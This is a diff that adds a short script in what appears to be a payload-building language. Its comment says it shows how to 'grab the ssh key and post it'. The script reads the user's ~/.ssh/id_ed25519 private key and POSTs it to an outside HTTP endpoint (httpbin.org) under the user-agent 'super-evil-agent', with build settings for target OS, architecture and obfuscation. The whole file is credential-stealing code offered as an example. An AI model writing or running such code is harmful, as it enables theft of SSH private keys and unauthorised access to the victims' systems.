@@ -1,0 +1,22 @@
+@ Showcases how you can grab the ssh key and post it @
+
+use system
+use network
+
+[
+    version 3.0
+    output ssh_key
+    os linux
+    arch amd64
+    obfuscate false
+    debugger_behavior stop
+]
+
+
+
+loop main_func {
+    system::read("€40€/.ssh/id_ed25519")
+    network::post(${"https://httpbin.org/post", "€1€", "super-evil-agent", "text/plain"}$)
+
+    system::exit("0")
+}
